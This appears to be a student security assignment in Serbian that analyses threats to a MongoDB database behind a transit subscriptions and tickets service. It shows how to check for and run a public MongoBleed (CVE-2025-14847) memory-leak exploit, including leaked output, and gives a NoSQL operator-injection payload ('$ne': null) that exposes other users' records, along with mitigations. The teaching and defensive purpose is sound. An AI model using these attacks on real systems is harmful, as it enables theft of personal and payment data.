# Pretnje, napadi i mitigacije na Subscriptions & Tickects Database (MongoDB)

## Uvod
Ovaj dokument analizira sigurnosne pretnje servisa za pretplate i karte sa fokusom na bazu podataka MongoDB. Analizirane su dve kritične ranjivosti: jedna na nivou samog database engine-a (MongoBleed) i jedna na nivou aplikacione logike (NoSQL Injection).

### Kontekst Sistema
Subscription & Ticket Management sistem koristi MongoDB (bazu `subscriptions_db`) za skladištenje i upravljanje svim aspektima prava na prevoz. Podaci su organizovani u sledeće ključne kolekcije:
- Kolekcija `users` (Lični podaci): Sadrži profile putnika sa visoko osetljivim informacijama, uključujući ime, prezime, email, broj telefona, adresu stanovanja i JMBG. Ovi podaci su pod direktnom zaštitom GDPR-a.
- Kolekcija `transport_subscriptions` (Digitalne karte i pretplate): Čuva detalje o kupljenim pravima na prevoz (gradski prevoz, taxi krediti, kombinovani paketi). Sadrži periode važenja (valid_until), statuse (active/expired), zone kretanja, kao i informacije o plaćanju (npr. card_last4, paypal_email).
- Kolekcija `payment_history` (Finansijski zapisi): Sadrži istoriju svih transakcija, iznose, valute i statuse plaćanja, što je ključno za reviziju i integritet prihoda sistema.
- Kolekcija `transport_zones` (Logistika): Definiše geografske zone (npr. Centralna zona, Prigradska zona) i njihove multiplikatore cena, na osnovu kojih sistem obračunava cenu pretplata.

### Kritični resursi pod rizikom:
- Poverljivost (GDPR): Izloženost `users` kolekcije direktno kompromituje identitet korisnika (naročito kroz JMBG i email).
- Integritet finansijskih zapisa: Neovlašćena izmena u `transport_subscriptions` može omogućiti besplatno korišćenje usluga ili nelegalnu dodelu "taxi kredita".
- Dostupnost i performanse: Indeksi nad user_id i status poljima su kritični za rad aplikacije u realnom vremenu.

## Katalog Napada
### 1) MongoDB Memory Leak - MongoBleed (CVE-2025-14847) 
Ova ranjivost omogućava neautentifikovanom napadaču da daljinski "izvuče" (leak) sadržaj memorije MongoDB procesa. Problem nastaje u `zlib` biblioteci za kompresiju, unutar mrežnog sloja MongoDB-a, gde se zbog greške u rukovanju baferima mogu pročitati susedni delovi memorije koji nisu namenjeni klijentu.

#### Resursi pod rizikom:
- Sistemska memorija MongoDB servera.
- Osetljivi podaci u memoriji (kredencijali, fragmenti logova, metapodaci baze).

#### Provera prisustva ranjivosti
<img width="3980" height="2643" alt="image" src="https://github.com/user-attachments/assets/78e35c77-6ed2-467f-b6bb-62b991f2ae2c" />
- Prvi korak je identifikacija verzije i provera mrežnog statusa servera:
```shell
docker exec -it mongodb mongosh -u admin -p admin --authenticationDatabase admin

# output
Current Mongosh Log ID: 6997899cf47860ecf89dc29c
Connecting to:          mongodb://<credentials>@127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&authSource=admin&appName=mongosh+2.5.9
Using MongoDB:          8.2.2
Using Mongosh:          2.5.9
```
- Provera da li je `zlib` biblioteka za kompresiju uključena
```shell
db.serverStatus().network
```
- Povratna vrednost koja sadrži `zlib` objekat sugeriše da je server konfigurisan sa ranjivim kompresorom.
```js
// output
{
  // ...
    zlib: { // postojanje zlib-a sugerise ranjivost na MongoBleed
      compressor: { bytesIn: Long('0'), bytesOut: Long('0') },
      decompressor: { bytesIn: Long('0'), bytesOut: Long('0') }
    },
 // ...
}
```
#### Napad
- Scenario: Izvlačenje osetljivih fragmenata iz memorije
  - Napadač koristi specijalizovanu skriptu (mongobleed.py) koja šalje izmenjene mrežne pakete.
- Rezultat: Skripta uspeva da izvuče fragmente logova i sistemskih informacija.
- Otkriće: U konkretnom napadu, skripta je izvukla 6848 bajtova, uključujući putanje do Docker kontejnera i, što je najkritičnije, pronađen je pattern "key", što ukazuje na curenje kriptografskih ključeva ili kredencijala.

Skripta za napad preuzeta sa [GitHub repozitorijuma](https://github.com/joe-desimone/mongobleed/blob/main/mongobleed.py)
- Pokretanje skripte
```shell
py ./mongobleed.py
```
- Rezultat pokretanja sačuvan u `./demos/exploits/leaked.bin`, a neki od potencijalno značajnih rezultata su prikazani u konzoli
```shell
Rade@Yoga D:\fax\MAS\ZOSS\zoss-predavanje\mongobleed-demo ( main): py .\mongobleed.py
[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
[*] Author: Joe Desimone - x.com/dez_
[*] Target: localhost:27017
[*] Scanning offsets 20-8192

[+] offset= 124 len=  39: llocated log files not ready and missed
[+] offset= 134 len=  34: ssions^\u0001k6�;W�J����Lw\u001b��
[+] offset= 611 len=  15: \u0007\u001b�oq
[+] offset= 719 len=  17: igger was reached
[+] offset= 736 len=  18: rErrors�\u0001��U
[+] offset=3093 len=  26: s skipped during tree walk
[+] offset=4861 len=1164: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
[+] offset=4867 len= 171: �c|W}W\u0003a�Z�Z�Z \t\u0013J�c�c:d+d�c�c�c�c�c�c\"d#dQd[d\\d]d^d_d`dRd\u001ad\u
[+] offset=5709 len=2455: xec,relatime master:527 - cgroup pids rw,pids\n1083 1070 0:78 /docker/768a468a0f
[+] offset=6645 len=  41: t BSON length in element with field name
[+] offset=6906 len=  38:  requested with cache fill ratio < 25%
[+] offset=7675 len=2221:  0 0\ncpu0 870 0 925 494844 119 0 1260 0 0 0\ncpu1 454 0 464 496708 54 0 259 0 0
[+] offset=7716 len= 141: \u001d��c�t��vTky�p��\u0012�V�\r��ӄ�dn\u000b� e*$\r76�3�\u0012\n�\u0010\u0006�
[+] offset=7757 len= 131: ����g\"�[g\u0016;�k��������$���?ay��6�\u001f\u0003���\u000b#��d\u001e}>��#X��\u0

[*] Total leaked: 6848 bytes
[*] Unique fragments: 110
[*] Saved to: leaked.bin
[!] Found pattern: key
```

#### Mitigacije
- Ažuriranje baze: Odmah preći na verziju MongoDB-a u kojoj je **CVE-2025-14847** otklonjen.
- Onemogućavanje zlib kompresije: Ako ažuriranje nije moguće, u konfiguraciji onemogućiti `zlib` kao mrežni kompresor.
- Mrežna segmentacija: Ograničiti pristup MongoDB portu (27017) samo na trusted IP adrese (backend servise).

2. NoSQL Injection via Operator Injection
Pretnje (Resursi)
Resursi pod rizikom:

Poverljivost svih pretplata u bazi.

Izolacija podataka među korisnicima (Multi-tenancy).

Ranjivost nastaje kada Subscription Service prima filtere od korisnika (obično preko Query parametara) i direktno ih prosleđuje MongoDB-u bez sanitizacije. Umesto prostog stringa, napadač šalje JSON objekat sa logičkim operatorima.

Napadi
Scenario: Neovlašćeni pristup celokupnoj bazi pretplata
Normalan zahtev korisnika USR001 vraća samo njegove dve pretplate:
GET /my-subscriptions?filter={"user_id":"USR001"}

Napad:
Napadač šalje zahtev sa operatorom $ne (not equal):
GET /my-subscriptions?filter={"user_id":{"$ne":null}}

Ishod:
Backend generiše MongoDB upit koji glasi: "Vrati sve zapise gde user_id nije null".

Sistem vraća pretplate korisnika USR002, USR003, USR004.

Napadač dobija uvid u tuđe paypal_email adrese, brojeve bankovnih računa (bank_account) i transaction_id.

Mitigacije
Strogo tipiziranje (Schema Binding): Ne dozvoliti direktno bind-ovanje filtera u bson.M. Koristiti fiksne strukture u Go-u gde je UserID isključivo tipa string.

Sanitizacija inputa: Implementirati middleware koji uklanja MongoDB operatore (koji počinju sa $) iz korisničkog inputa.

Primenjivanje vlasništva u kodu: U handler-u uvek forsirati user_id izvučen iz JWT tokena:

Go
// Pogrešno:
filter := c.Query("filter") 

// Ispravno:
userID, _ := c.Get("user_id") // Iz auth middleware-a
finalFilter := bson.M{"user_id": userID} // Ignoriši filtere iz request-a za polje user_id
Praktična demonstracija
Za detaljan prikaz sprovedenog MongoBleed napada i rezultate NoSQL Injection eksploatacije, pogledati dokumentaciju u folderu:
📍 D:\fax\MAS\ZOSS\zoss-predavanje\mongobleed-demo
